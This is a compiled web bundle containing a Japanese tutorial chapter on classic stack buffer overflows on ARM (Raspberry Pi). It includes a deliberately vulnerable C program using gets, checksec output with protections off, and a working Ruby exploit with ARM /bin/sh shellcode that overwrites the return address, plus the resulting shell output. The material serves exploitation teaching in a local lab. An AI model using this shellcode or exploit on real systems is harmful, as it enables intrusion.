(window.webpackJsonp=window.webpackJsonp||[]).push([[5],{201:function(t,s,a){t.exports=a.p+"assets/img/image1.69e904f5.png"},202:function(t,s,a){t.exports=a.p+"assets/img/image2.03dda377.png"},211:function(t,s,a){"use strict";a.r(s);var n=a(0),e=Object(n.a)({},(function(){var t=this,s=t.$createElement,n=t._self._c||s;return n("ContentSlotsDistributor",{attrs:{"slot-key":t.$parent.slotKey}},[n("h1",{attrs:{id:"_2-buffer-overflow"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#_2-buffer-overflow","aria-hidden":"true"}},[t._v("#")]),t._v(" 2. Buffer Overflow")]),t._v(" "),n("p",[t._v("本章では、古典的なスタックベースのバッファオーバーフローについて見ていきます。Exploit 経験者であれば、本章の内容はx86 アーキテクチャなどと差異はほとんどないと思うでしょう。簡単にバッファオーバーフローの原理について紹介した後に、前章で作成したシェルコードを使ってシェルを奪う演習問題を解いていきます。バッファオーバーフローには、スタックバッファオーバーフローとヒープバッファオーバーフローの2つあります。本章では、前者について触れていきます。")]),t._v(" "),n("h2",{attrs:{id:"_2-1-バッファオーバーフローの原理"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#_2-1-バッファオーバーフローの原理","aria-hidden":"true"}},[t._v("#")]),t._v(" 2.1 バッファオーバーフローの原理")]),t._v(" "),n("p",[t._v("バッファオーバーフローは、予め設計されたバッファのサイズを超える読み込みを許容してしまう脆弱性のことです。Linux においてあるプロセスが実行されると、スタック領域が確保されローカル変数の領域として利用します。ここでは、このスタック領域でのバッファオーバーフローが起こる際の挙動について記載します。まずは以下のプログラムを見てみましょう（bof.c）。")]),t._v(" "),n("div",{staticClass:"language-c extra-class"},[n("pre",{pre:!0,attrs:{class:"language-c"}},[n("code",[n("span",{pre:!0,attrs:{class:"token macro property"}},[t._v("#"),n("span",{pre:!0,attrs:{class:"token directive keyword"}},[t._v("include")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token string"}},[t._v("<stdio.h>")])]),t._v("\n"),n("span",{pre:!0,attrs:{class:"token macro property"}},[t._v("#"),n("span",{pre:!0,attrs:{class:"token directive keyword"}},[t._v("include")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token string"}},[t._v("<stdlib.h>")])]),t._v("\n"),n("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("int")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token function"}},[t._v("main")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),n("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("int")]),t._v(" argc"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("char")]),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("*")]),t._v(" argv"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("{")]),t._v("\n    "),n("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("char")]),t._v(" buf"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),n("span",{pre:!0,attrs:{class:"token number"}},[t._v("0x100")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n    "),n("span",{pre:!0,attrs:{class:"token function"}},[t._v("setbuf")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),n("span",{pre:!0,attrs:{class:"token constant"}},[t._v("stdout")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token constant"}},[t._v("NULL")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n    "),n("span",{pre:!0,attrs:{class:"token function"}},[t._v("printf")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),n("span",{pre:!0,attrs:{class:"token string"}},[t._v('"stack: %p\\n"')]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" buf"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n    "),n("span",{pre:!0,attrs:{class:"token function"}},[t._v("gets")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("buf"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n    "),n("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("return")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token number"}},[t._v("0")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("}")]),t._v("\n")])])]),n("p",[t._v("本プログラムでは、入力長さの長さを指定できない"),n("code",[t._v("gets")]),t._v(" 関数を使用しています。意図されたバッファのサイズは0x100なので、これ以上の入力をすることでスタックの後続の領域を上書きすることが可能となります。スタックには、"),n("code",[t._v("return 0")]),t._v(" で元の関数に戻るためのリターンアドレスが格納や関数内部のスタックのベースを示すフレームポインタが格納されています。本プログラムのスタックの使われ方を図示すると以下のようになります。図示されているアドレスはあくまで例です。")]),t._v(" "),n("table",[n("thead",[n("tr",[n("th",{staticStyle:{"text-align":"center"}},[t._v("アドレス")]),t._v(" "),n("th",{staticStyle:{"text-align":"left"}},[t._v("値")])])]),t._v(" "),n("tbody",[n("tr",[n("td",{staticStyle:{"text-align":"center"}},[t._v("0x1000")]),t._v(" "),n("td",{staticStyle:{"text-align":"left"}},[t._v("bufの値")])]),t._v(" "),n("tr",[n("td",{staticStyle:{"text-align":"center"}},[t._v("0x1100")]),t._v(" "),n("td",{staticStyle:{"text-align":"left"}},[t._v("フレームポインタ")])]),t._v(" "),n("tr",[n("td",{staticStyle:{"text-align":"center"}},[t._v("0x1104")]),t._v(" "),n("td",{staticStyle:{"text-align":"left"}},[t._v("リターンアドレス")])])])]),t._v(" "),n("p",[t._v("上記の図より、0x100を超える入力を行うことで、関数の戻り先であるリターンアドレスを上書きして制御を奪うことが可能となります。gefでgets関数の実行手前で止めて引数を確認してみましょう。gets関数の第1引数は、入力を保存するアドレスなので、r0レジスタの値を確認すると0xbefff420 であることがわかります。（上の図でいうところの0x1000）")]),t._v(" "),n("p",[n("img",{attrs:{src:a(201),alt:"gets関数の実行直前"}})]),t._v(" "),n("p",[t._v("次に、最後関数から戻る際の周辺の図が以下です。spの値が、0xbefff520 であることがわかります。ここから、"),n("code",[t._v("pop {r11, pc}")]),t._v(" が実行されるため、0xbefff524に格納されている値がr11に、0xbefff528に格納されている値がpcに格納されることになります。つまり0x100 より大きい値を入力することで、フレームポインタやリターンアドレスを上書きすることができることわかります。")]),t._v(" "),n("p",[n("img",{attrs:{src:a(202),alt:"popの手前"}})]),t._v(" "),n("p",[t._v("この時、戻り先をどこに書き換えれば良いでしょうか。今回のプログラムでは、スタックのアドレスである"),n("code",[t._v("buf")]),t._v(" 変数のアドレスをリークしてくれているため、このアドレスにジャンプすることで、入力したシェルコードを実行することが可能となります。ただし、最近のgccのセキュリティ機構では、スタック領域など読み書きすることのみを想定された領域には実行権限が付与されていないため通常では入力したシェルコードを実行することができません。今回は、gccのセキュリティ機構を無効にした状態でコンパイルしているため実行権限が付与されています。gefでは、"),n("code",[t._v("checksec")]),t._v(" コマンドを使うことでセキュリティ機構を確認できます。")]),t._v(" "),n("div",{staticClass:"language-bash extra-class"},[n("pre",{pre:!0,attrs:{class:"language-bash"}},[n("code",[t._v("$ gdb -q bof\ngef➤  checksec\n"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("+"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" checksec "),n("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("for")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token string"}},[t._v("'/home/pi/ARM_Exploit/docs/chapter02/bof'")]),t._v("\nCanary                        "),n("span",{pre:!0,attrs:{class:"token builtin class-name"}},[t._v(":")]),t._v(" No\nNX                            "),n("span",{pre:!0,attrs:{class:"token builtin class-name"}},[t._v(":")]),t._v(" No\nPIE                           "),n("span",{pre:!0,attrs:{class:"token builtin class-name"}},[t._v(":")]),t._v(" No\nFortify                       "),n("span",{pre:!0,attrs:{class:"token builtin class-name"}},[t._v(":")]),t._v(" No\nRelRO                         "),n("span",{pre:!0,attrs:{class:"token builtin class-name"}},[t._v(":")]),t._v(" Partial\n")])])]),n("p",[t._v("ここで、NXがNoになっている場合、スタックなどの実行権限は付与されていません。これはNo Executable bitを意味しています。またCanaryは、スタックベースのバッファオーバーフローを防ぐgccのSSP（Stack Smashing Protection）と呼ばれるセキュリティ機構が有効であるかを示しています。先程の図を使うと以下のようフレームポインタの手前にCanary と呼ばれる値を格納しており、これが書き換わると強制終了する関数を呼ぶ処理が実行されるようになります。")]),t._v(" "),n("table",[n("thead",[n("tr",[n("th",{staticStyle:{"text-align":"center"}},[t._v("アドレス")]),t._v(" "),n("th",{staticStyle:{"text-align":"left"}},[t._v("値")])])]),t._v(" "),n("tbody",[n("tr",[n("td",{staticStyle:{"text-align":"center"}},[t._v("0x1000")]),t._v(" "),n("td",{staticStyle:{"text-align":"left"}},[t._v("bufの値")])]),t._v(" "),n("tr",[n("td",{staticStyle:{"text-align":"center"}},[t._v("0x1100")]),t._v(" "),n("td",{staticStyle:{"text-align":"left"}},[t._v("Canary")])]),t._v(" "),n("tr",[n("td",{staticStyle:{"text-align":"center"}},[t._v("0x1104")]),t._v(" "),n("td",{staticStyle:{"text-align":"left"}},[t._v("フレームポインタ")])]),t._v(" "),n("tr",[n("td",{staticStyle:{"text-align":"center"}},[t._v("0x1108")]),t._v(" "),n("td",{staticStyle:{"text-align":"left"}},[t._v("リターンアドレス")])])])]),t._v(" "),n("p",[t._v("Canary については、後の章で詳しく扱っていきます。")]),t._v(" "),n("h2",{attrs:{id:"_2-2-バッファオーバーフローを用いたシェル奪取"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#_2-2-バッファオーバーフローを用いたシェル奪取","aria-hidden":"true"}},[t._v("#")]),t._v(" 2.2 バッファオーバーフローを用いたシェル奪取")]),t._v(" "),n("p",[t._v("では、ここまでの説明を踏まえてバッファオーバーフローを用いてシェルコードを実行させることで、シェルを奪取します。前章と同じようにsocat を用いてバイナリを8888/tcp で待ち受けてください。")]),t._v(" "),n("div",{staticClass:"language-bash extra-class"},[n("pre",{pre:!0,attrs:{class:"language-bash"}},[n("code",[t._v("$ socat tcp-l:8888,reuseaddr,fork exec:./bof\n")])])]),n("p",[t._v("次に、前述したとおり0x100 バイトより大きい値を入力することで、リターンアドレスを書き換えることができます。具体的には、フレームポインタの次にリターンアドレスが格納されているため、0x100+4の0x104バイトのパディングの後に、リターンアドレスに到達にします。リターンアドレスは、予めリークされているスタックのアドレスに書き換えることで、入力した値の先頭から実行してくれます。")]),t._v(" "),n("p",[t._v("ここまでの情報を踏まえて作成したExploit コードを以下に示します。")]),t._v(" "),n("div",{staticClass:"language-ruby extra-class"},[n("pre",{pre:!0,attrs:{class:"language-ruby"}},[n("code",[n("span",{pre:!0,attrs:{class:"token comment"}},[t._v("#!/usr/bin/env ruby")]),t._v("\n"),n("span",{pre:!0,attrs:{class:"token comment"}},[t._v("# coding: ascii-8bit")]),t._v("\n"),n("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("require")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token string"}},[t._v("'pwn'")]),t._v("\n\nhost "),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token string"}},[t._v("'localhost'")]),t._v("\nport "),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token number"}},[t._v("8888")]),t._v("\nz "),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token constant"}},[t._v("Sock")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),n("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("new")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token class-name"}},[t._v("host")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" port\ntmp "),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" z"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("recvline\nstack_address "),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" tmp"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("match"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),n("span",{pre:!0,attrs:{class:"token regex"}},[t._v("/: (.+)\\n/")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),n("span",{pre:!0,attrs:{class:"token number"}},[t._v("1")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("to_i"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),n("span",{pre:!0,attrs:{class:"token number"}},[t._v("16")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\npayload "),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token string"}},[t._v('"\\x01\\x70\\x8f\\xe2\\x17\\xff\\x2f\\xe1\\x04\\xa7\\x03\\xcf\\x52\\x40\\x07\\xb4\\x68\\x46\\x05\\xb4\\x69\\x46\\x0b\\x27\\x01\\xdf\\x01\\x01\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68"')]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("ljust"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),n("span",{pre:!0,attrs:{class:"token number"}},[t._v("0x104")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token string"}},[t._v('"A"')]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\npayload "),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("<")]),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("<")]),t._v(" p32"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("stack_address"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\nz"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("sendline payload\nz"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("interact\n")])])]),n("p",[t._v("上記コードを実行した結果が以下です。")]),t._v(" "),n("div",{staticClass:"language-bash extra-class"},[n("pre",{pre:!0,attrs:{class:"language-bash"}},[n("code",[t._v("$ ./solve.rb\n"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("INFO"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" Switching to interactive mode\n"),n("span",{pre:!0,attrs:{class:"token function"}},[t._v("uname")]),t._v(" -a\nLinux raspberrypi "),n("span",{pre:!0,attrs:{class:"token number"}},[t._v("4.19")]),t._v(".50+ "),n("span",{pre:!0,attrs:{class:"token comment"}},[t._v("#1 Sat Jul 6 20:44:28 CEST 2019 armv6l GNU/Linux")]),t._v("\n"),n("span",{pre:!0,attrs:{class:"token function"}},[t._v("id")]),t._v("\n"),n("span",{pre:!0,attrs:{class:"token assign-left variable"}},[t._v("uid")]),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),n("span",{pre:!0,attrs:{class:"token number"}},[t._v("1000")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("pi"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token assign-left variable"}},[t._v("gid")]),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),n("span",{pre:!0,attrs:{class:"token number"}},[t._v("1000")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("pi"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token assign-left variable"}},[t._v("groups")]),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),n("span",{pre:!0,attrs:{class:"token number"}},[t._v("1000")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("pi"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(",4"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("adm"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(",20"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("dialout"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(",24"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("cdrom"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(",27"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("sudo"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(",29"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("audio"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(",44"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("video"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(",46"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("plugdev"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(",60"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("games"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(",100"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("users"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(",105"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("input"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(",109"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("netdev"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(",997"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("gpio"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(",998"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("i2c"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(",999"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("spi"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n")])])]),n("p",[t._v("Raspbian のシェルが操作できていることが確認できました。")]),t._v(" "),n("h2",{attrs:{id:"_2-3-まとめ"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#_2-3-まとめ","aria-hidden":"true"}},[t._v("#")]),t._v(" 2.3 まとめ")]),t._v(" "),n("p",[t._v("本章では、スタックのバッファオーバーフローについて見てきました。実際にリターンアドレスをどのように書き換えて、シェルコードを実行するのかについて見てきました。この形のExploit は最も古典的な手法なため理解しておくことは重要です。")])])}),[],!1,null,null,null);s.default=e.exports}}]);